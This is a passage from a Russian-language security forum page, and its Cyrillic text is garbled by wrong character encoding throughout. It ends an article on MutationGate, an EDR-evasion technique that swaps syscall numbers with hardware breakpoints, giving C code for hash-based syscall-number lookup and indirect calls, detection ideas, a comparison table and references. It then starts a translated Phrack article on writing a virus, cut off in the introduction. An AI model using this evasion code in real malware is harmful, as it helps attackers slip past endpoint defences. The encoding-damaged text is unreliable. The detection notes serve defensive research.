    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportdirectory_foa);    //Calculate corresponding offset
    PDWORD FunctionNameArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfNames));
    PDWORD FunctionAddressArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfFunctions));
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfNameOrdinals));

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++)
    {
        CHAR* pFunctionName = (CHAR*)(pBase + RvaToFileOffset(pImgNtHdrs, FunctionNameArray[i]));
        DWORD Function_RVA = FunctionAddressArray[FunctionOrdinalArray[i]];
        if (Hash == ROR13Hash(pFunctionName))
        {
            void *ptr = malloc(10);
            if (ptr == NULL) {
                perror(&quot;malloc failed&quot;);
                return -1;
            }
            unsigned char byteAtOffset5 = *((unsigned char*)(pBase + RvaToFileOffset(pImgNtHdrs, Function_RVA)) + 4);
            //printf(&quot;Syscall number of function %s is: 0x%x\n&quot;, pFunctionName,byteAtOffset5);    //0x18
            free(ptr);
            return byteAtOffset5;
        }
    }
    return 0x0;
}
...&lt;SNIP&gt;...</code></pre>
	</div>
</div><br />
–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –≤—ã–∑–≤–∞–ª–∏ NtDrawText, –Ω–æ —Å –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ NtQueryInformationProcess, –≤—ã–∑–æ–≤ –¥–æ–ª–∂–µ–Ω –±—ã–ª –±—ã –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è –Ω–µ—É–¥–∞—á–µ–π. –û–¥–Ω–∞–∫–æ, —Ç–∞–∫ –∫–∞–∫ –º—ã –∏–∑–º–µ–Ω–∏–ª–∏ SSN, —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É—Å–ø–µ—à–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnNtQueryInformationProcess pNTQIP = (fnNtQueryInformationProcess)pNTDT;
  NTSTATUS status = pNTQIP(pi.hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);</code></pre>
	</div>
</div><br />
–í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ, SSN NtDrawText —Ä–∞–≤–µ–Ω 0xdd, SSN NtQueryInformationProcess —Ä–∞–≤–µ–Ω 0x19, –∞–¥—Ä–µ—Å NtDrawText —Ä–∞–≤–µ–Ω 0x00007FFBAD00EB60.<br />
–í—ã–∑–æ–≤ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è –ø–æ –∞–¥—Ä–µ—Å—É NtDrawText, –Ω–æ —Å –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ NtQueryInformationProcess. –ü–æ—Å–∫–æ–ª—å–∫—É SSN –∏–∑–º–µ–Ω–µ–Ω —Å 0xdd –Ω–∞ 0x19, —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É—Å–ø–µ—à–Ω–æ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798075115.png"
		data-src="https://osint42.org/attachments/1746798075115-png.363/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798075115-png.363/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798075115.png"
			title="1746798075115.png"
			width="1034" height="386" loading="lazy" />
	</div><br />
<br />
–î–∞–≤–∞–π—Ç–µ –∏–∑–º–µ–Ω–∏–º –∫–æ–¥ –∏ —Å–Ω–æ–≤–∞ –ø–æ—ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∏—Ä—É–µ–º —Å NtDelayExecution, —É—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ –Ω–∞–º –±—É–¥–µ—Ç –ª–µ–≥—á–µ –Ω–∞–±–ª—é–¥–∞—Ç—å —Å—Ç–µ–∫ –≤—ã–∑–æ–≤–æ–≤. –ö–∞–∫ –∏ –æ–∂–∏–¥–∞–ª–æ—Å—å, —ç—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ Yara, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —Ä–∞–Ω–µ–µ, –Ω–µ –º–æ–≥—É—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –Ω–∏–∫–∞–∫–æ–π —à–∞–±–ª–æ–Ω –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –±–∞–π—Ç–æ–≤.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798084566.png"
		data-src="https://osint42.org/attachments/1746798084566-png.364/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798084566-png.364/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798084566.png"
			title="1746798084566.png"
			width="1415" height="119" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å—Ç–µ–∫ –≤—ã–∑–æ–≤–æ–≤: —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–Ω–∏—Ü–∏–∏—Ä—É–µ—Ç—Å—è –∏–∑ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ –ø–∞–º—è—Ç–∏ ntdll, —á—Ç–æ –≤—ã–≥–ª—è–¥–∏—Ç –ª–µ–≥–∏—Ç–∏–º–Ω—ã–º —Å —ç—Ç–æ–π —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è. –û–¥–Ω–∞–∫–æ KeDelayExecutionThread –æ–∂–∏–¥–∞–µ—Ç NtDelayExecution –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–≥–æ NTAPI, –∞ –Ω–µ NtDrawText. –≠—Ç–∞ –ø–æ–¥—Å–∫–∞–∑–∫–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798093446.png"
		data-src="https://osint42.org/attachments/1746798093446-png.365/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798093446-png.365/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798093446.png"
			title="1746798093446.png"
			width="613" height="566" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-preimushchestva-i-obnaruzheniye"></a>–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ&#8203;<a class="hoverLink" href="#-preimushchestva-i-obnaruzheniye" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>MutationGate –∏–º–µ–µ—Ç —Å–≤–æ–∏ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞, –Ω–æ –µ–≥–æ —Ç–∞–∫–∂–µ –≤–æ–∑–º–æ–∂–Ω–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å. –ï—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å –¥—Ä—É–≥–∏–µ –∏–¥–µ–∏ –æ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞—Ö –∏ —Å–ø–æ—Å–æ–±–∞—Ö –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–æ–æ–±—â–∏—Ç–µ –º–Ω–µ : )<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-preimushchestva"></a>–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞&#8203;<a class="hoverLink" href="#-preimushchestva" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h4><ul>
<li data-xf-list-type="ul">–ù–µ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –≤—Ç–æ—Ä–æ–π –º–æ–¥—É–ª—å ntdll</li>
<li data-xf-list-type="ul">–ù–µ—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–º –º–æ–¥—É–ª–µ ntdll</li>
<li data-xf-list-type="ul">–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ —à–∞–±–ª–æ–Ω–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –±–∞–π—Ç–æ–≤</li>
<li data-xf-list-type="ul">–°–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏–Ω–∏—Ü–∏–∏—Ä—É–µ—Ç—Å—è –≤ –º–æ–¥—É–ª–µ ntdll, —á—Ç–æ –≤—ã–≥–ª—è–¥–∏—Ç –ª–µ–≥–∏—Ç–∏–º–Ω–æ</li>
</ul><h4 class="bbHeading"><a class="u-anchorTarget" name="-vozmozhnyye-sposoby-obnaruzheniya"></a>–í–æ–∑–º–æ–∂–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è&#8203;<a class="hoverLink" href="#-vozmozhnyye-sposoby-obnaruzheniya" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h4><ul>
<li data-xf-list-type="ul">–í—ã–∑–æ–≤ AddVectoredExceptionHandler –º–æ–∂–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ –≤ –æ–±—ã—á–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–µ</li>
<li data-xf-list-type="ul">–§—É–Ω–∫—Ü–∏—è –≤ ntoskrnl.exe –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –º–æ–¥—É–ª–µ ntdll</li>
<li data-xf-list-type="ul">–ò–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –≤ –±–µ–∑–≤—Ä–µ–¥–Ω–æ–º NTAPI –Ω–µ –¥–æ–ª–∂–µ–Ω –æ–∂–∏–¥–∞—Ç—å SSN –¥—Ä—É–≥–æ–≥–æ NTAPI</li>
</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-sravneniye-s-drugimi-pokhozhimi-podkhodami"></a>–°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å –¥—Ä—É–≥–∏–º–∏ –ø–æ—Ö–æ–∂–∏–º–∏ –ø–æ–¥—Ö–æ–¥–∞–º–∏&#8203;<a class="hoverLink" href="#-sravneniye-s-drugimi-pokhozhimi-podkhodami" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>HWSyscall (<a href="https://github.com/Dec0ne/HWSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - Dec0ne/HWSyscalls: HWSyscalls is a new method to execute indirect syscalls using HWBP, HalosGate and a synthetic trampoline on kernel32 with HWBP.</a>) –∏ TamperingSyscall (<a href="https://github.com/rad9800/TamperingSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - rad9800/TamperingSyscalls</a>) –æ–±–∞ –∏–∑–æ–±—Ä–µ—Ç–∞—Ç–µ–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞ –¥–ª—è –æ–±—Ö–æ–¥–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã—Ö —Ö—É–∫–æ–≤, –∏ –æ–±–∞ —ç—Ç–∏—Ö –ø–æ–¥—Ö–æ–¥–∞ –æ—Ç–ª–∏—á–Ω—ã–µ.<br />
<br />
–•–æ—Ç—è —è –Ω–µ —á–∏—Ç–∞–ª –∏ –Ω–µ —Å—Å—ã–ª–∞–ª—Å—è –Ω–∞ —ç—Ç–∏ –¥–≤–∞ –ø—Ä–æ–µ–∫—Ç–∞ –≤–æ –≤—Ä–µ–º—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ –≤—ã–ø—É—Å–∫–∞ MutationGate (–ø–æ—Å–ª–µ –≤—ã–ø—É—Å–∫–∞ MutationGate, –¥—Ä—É–≥ –ø—Ä–∏—Å–ª–∞–ª –º–Ω–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ —ç—Ç–∏ –¥–≤–∞ –ø—Ä–æ–µ–∫—Ç–∞), –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –µ—Å—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–æ—Ö–æ–∂–∏–µ —Ç–µ—Ö–Ω–∏–∫–∏ –∏–ª–∏ –æ–±—â–∏–µ –∏–¥–µ–∏. –Ø –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–æ—á–∏—Ç–∞–ª –∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞–ª –∏—Ö, –∏ —è —Å–æ—Å—Ç–∞–≤–∏–ª —Ç–∞–±–ª–∏—Ü—É –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbTable">
<table style='width: 100%'><tr><th>–ü–æ–¥—Ö–æ–¥</th><th>–í—ã–∑–æ–≤</th><th>–ê—Ä–≥—É–º–µ–Ω—Ç—ã</th><th>SSN</th><th>–°–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤</th></tr><tr><td>MutationGate</td><td>–ë–µ–∑–≤—Ä–µ–¥–Ω—ã–π NTAPI</td><td>–ê—Ä–≥—É–º–µ–Ω—Ç—ã —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI</td><td>SSN –±–µ–∑–≤—Ä–µ–¥–Ω–æ–≥–æ NTAPI -&gt; SSN —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI</td><td>–í –±–µ–∑–≤—Ä–µ–¥–Ω–æ–º NTAPI</td></tr><tr><td>HWSyscall</td><td>–¶–µ–ª–µ–≤–æ–π NTAPI</td><td>–ê—Ä–≥—É–º–µ–Ω—Ç—ã —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI</td><td>SSN —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI –ø–æ—Å–ª–µ –µ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è</td><td>–í –±–ª–∏–∂–∞–π—à–µ–º –Ω–µ–∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–º NTAPI</td></tr><tr><td>TamperingSyscall</td><td>–¶–µ–ª–µ–≤–æ–π NTAPI</td><td>–ü–æ–¥—Å—Ç–∞–≤–Ω—ã–µ -&gt; –ê—Ä–≥—É–º–µ–Ω—Ç—ã —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI</td><td>SSN —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI –ø–æ—Å–ª–µ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ EDR</td><td>–í —Ü–µ–ª–µ–≤–æ–º NTAPI</td></tr><tr><td>–ö–æ—Å–≤–µ–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤</td><td>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è ASM —Ñ—É–Ω–∫—Ü–∏—è</td><td>–ê—Ä–≥—É–º–µ–Ω—Ç—ã —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI</td><td>SSN —Ü–µ–ª–µ–≤–æ–≥–æ NTAPI –ø–æ—Å–ª–µ –µ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è</td><td>–í –ª—é–±–æ–º –Ω–µ–∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–º NTAPI</td></tr></table>
</div><h3 class="bbHeading"><a class="u-anchorTarget" name="-"></a>&#8203;<a class="hoverLink" href="#-" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3><h3 class="bbHeading"><a class="u-anchorTarget" name="-blagodarnosti-i-ssylki"></a>–ë–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç–∏ –∏ —Å—Å—ã–ª–∫–∏&#8203;<a class="hoverLink" href="#-blagodarnosti-i-ssylki" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–í –ø–µ—Ä–∏–æ–¥ –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ —è –±—ã–ª –≤–¥–æ—Ö–Ω–æ–≤–ª–µ–Ω, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–ª –∏ –≤—ã–ø—É—Å—Ç–∏–ª MutationGate, —Å–ª–µ–¥—É—é—â–∏–µ —Ä–µ—Å—É—Ä—Å—ã –±—ã–ª–∏ –æ—á–µ–Ω—å –ø–æ–ª–µ–∑–Ω—ã –¥–ª—è –º–µ–Ω—è, –∏ —è –±–ª–∞–≥–æ–¥–∞—Ä–µ–Ω –∏—Ö –∞–≤—Ç–æ—Ä–∞–º.<br />
<br />
<a href="https://github.com/senzee1984/MutationGate" target="_blank" class="link link--external" rel="noopener">GitHub - senzee1984/MutationGate: Use hardware breakpoint to dynamically change SSN in run-time</a><br />
<br />
<a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/" target="_blank" class="link link--external" rel="noopener">SysWhispers is dead, long live SysWhispers!</a><br />
<br />
<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" class="link link--external" rel="noopener">GitHub - jthuraisamy/SysWhispers2: AV/EDR evasion via direct system calls.</a><br />
<br />
<a href="https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass - Ethical Chaos</a><br />
<br />
<a href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/" target="_blank" class="link link--external" rel="noopener">Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams - MDSec</a><br />
<br />
<a href="https://thewover.github.io/Dynamic-Invoke/" target="_blank" class="link link--external" rel="noopener">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</a><br />
<br />
<a href="https://cyberwarfare.live/bypassing-av-edr-hooks-via-vectored-syscall-poc/" target="_blank" class="link link--external" rel="noopener">Bypassing AV/EDR Hooks via Vectored Syscall - POC - CWL : Advanced Cyber Attack &amp; Detection Learning Platform</a><br />
<br />
<a href="https://redops.at/en/blog/syscalls-via-vectored-exception-handling" target="_blank" class="link link--external" rel="noopener">Syscalls via Vectored Exception Handling - RedOps</a><br />
<br />
<a href="https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass</a><br />
<br />
<a href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html" target="_blank" class="link link--external" rel="noopener">Silly EDR Bypasses and Where To Find Them ‚Äì MalwareTech</a><br />
<br />
<a href="https://github.com/Dec0ne/HWSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - Dec0ne/HWSyscalls: HWSyscalls is a new method to execute indirect syscalls using HWBP, HalosGate and a synthetic trampoline on kernel32 with HWBP.</a><br />
<br />
<a href="https://github.com/rad9800/TamperingSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - rad9800/TamperingSyscalls</a><br />
<br />
<a href="https://github.com/RedTeamOperations/VEH-PoC" target="_blank" class="link link--external" rel="noopener">GitHub - RedTeamOperations/VEH-PoC</a></div>
						

							<h2>–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ –≤–∏—Ä—É—Å–∞ –≤ 2024 –≥–æ–¥—É</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746798186533.png"
		data-src="https://osint42.org/attachments/1746798186533-png.366/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798186533-png.366/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798186533.png"
			title="1746798186533.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
–ü–µ—Ä–µ–≤–æ–¥:<a href="http://phrack.org/issues/71/9.html#article" target="_blank" class="link link--external" rel="noopener">.:: Phrack Magazine ::.</a><br />
<br />
--[ –°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ<br />
<ol>
<li data-xf-list-type="ol">–í–≤–µ–¥–µ–Ω–∏–µ</li>
<li data-xf-list-type="ol">–ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</li>
<li data-xf-list-type="ol">–ü—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</li>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</li>
<li data-xf-list-type="ol">–†–µ—à–µ–Ω–∏–µ –ø—Ä–æ–±–ª–µ–º –ø—Ä–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ 5.1. –ò—Å—Ö–æ–¥–Ω—ã–π –¥–∏–∑–∞–π–Ω –Ω–µ—É–¥–∞—á–µ–Ω 5.2. –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –ª–æ–≤–∏—Ç –≤–∏—Ä—É—Å</li>
<li data-xf-list-type="ol">–ó–∞–∫–ª—é—á–µ–Ω–∏–µ</li>
<li data-xf-list-type="ol">–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏—è</li>
<li data-xf-list-type="ol">–°—Å—ã–ª–∫–∏</li>
<li data-xf-list-type="ol">–ê—Ä—Ç–µ—Ñ–∞–∫—Ç—ã</li>
</ol><b>--[ 1. –í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–ù–µ—Ç –Ω–∏—á–µ–≥–æ –±–æ–ª–µ–µ –∑–∞—Ö–≤–∞—Ç—ã–≤–∞—é—â–µ–≥–æ, —á–µ–º —É—Å–ø–µ—à–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞.<br />
<br />
–õ–µ–≥–∫–æ –∑–∞–±—ã—Ç—å, –∑–∞–Ω–∏–º–∞—è—Å—å –Ω–∞—à–∏–º–∏ —Ç—ë–º–Ω—ã–º–∏ –∏—Å–∫—É—Å—Å—Ç–≤–∞–º–∏ ‚Äî –æ—Ç –Ω–∞–ø–∏—Å–∞–Ω–∏—è –≤–∏—Ä—É—Å–æ–≤ –¥–æ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ ‚Äî —á—Ç–æ –≤–æ –≤—Å—ë–º, —á—Ç–æ –º—ã –¥–µ–ª–∞–µ–º, –º—ã —Å–æ–∑–¥–∞—ë–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ.<br />
–ò –æ–Ω–æ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Å–ª–æ–∂–Ω—ã–º. –ö–æ–Ω–µ—á–Ω–æ, –¥–ª—è shell-–∫–æ–¥–∞ —ç—Ç–æ –≤—Å–µ–≥–æ –ª–∏—à—å –æ–¥–Ω–æ—Å—Ç—Ä–æ—á–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ —Å NASM –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –±–∏–Ω–∞—Ä–Ω–æ–≥–æ –±–ª–æ–±–∞.<br />
–≠—Ç–æ —Å–æ–≤—Å–µ–º –Ω–µ—Å–ª–æ–∂–Ω–æ. –ù–æ –≤–µ–¥—å shell-–∫–æ–¥ –∫—É–¥–∞-—Ç–æ –≤—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç—Å—è, –≤–µ—Ä–Ω–æ? –Ø–∑—ã–∫ C–∏ –Ω–µ –ø–æ–∑–≤–æ–ª–∏—Ç –≤–∞–º –ø—Ä–æ—Å—Ç–æ –æ–±—ä–µ–¥–∏–Ω–∏—Ç—å –±–∏–Ω–∞—Ä–Ω—ã–µ –±–ª–æ–±—ã –≤ –≤–∞—à –∫–æ–¥. (–ü–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ, –¥–æ –≤—ã—Ö–æ–¥–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞ C23.)<br />
<br />
–ò –Ω–µ –≤—Å–µ–≥–¥–∞ —Ç–∞–∫ –ø—Ä–æ—Å—Ç–æ, –∫–∞–∫ –∫–∞–∂–µ—Ç—Å—è, –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏–∫–ª–µ–∏—Ç—å –≤–∞—à –±–ª–æ–± –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É. –ê —á—Ç–æ, –µ—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –∫–∞–∫-—Ç–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å shell-–∫–æ–¥? –ê —á—Ç–æ, –µ—Å–ª–∏ –¥—Ä—É–≥–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ –¥–æ–ª–∂–Ω–∞ —Ä–∞–±–æ—Ç–∞—Ç—å —Å —ç—Ç–∏–º shell-–∫–æ–¥–æ–º? –ò —ç—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π –¥—Ä—É–≥–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ —Ü–µ–ø–æ—á–∫–µ! –ò —ç—Ç–æ –¥–∞–∂–µ –Ω–µ —É—á–∏—Ç—ã–≤–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—é, –∫–æ—Ç–æ—Ä—É—é –º–æ–∂–µ—Ç –ø–æ—Ç—Ä–µ–±–æ–≤–∞—Ç—å –≤–∞—à assembly payload, –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–∏–Ω–∞–º–∏—á–µ—Å–∫—É—é –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é.<br />
<br />
–ù–∞—à–∏ —Ç—ë–º–Ω—ã–µ –∏—Å–∫—É—Å—Å—Ç–≤–∞ ‚Äî —ç—Ç–æ —Ö–∞–æ—Å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø—Ä–æ–µ–∫—Ç–∞–º–∏: —Ñ–∞–±—Ä–∏–∫–∏ payload-–æ–≤, –º–∞—Ç—Ä—ë—à–∫–∞ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –º–Ω–æ–∂–µ—Å—Ç–≤–æ –¥–≤–∏–∂—É—â–∏—Ö—Å—è —á–∞—Å—Ç–µ–π, —Ç—Ä–µ–±—É—é—â–∏—Ö –∏–∑–æ–±—Ä–µ—Ç–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏.<br />
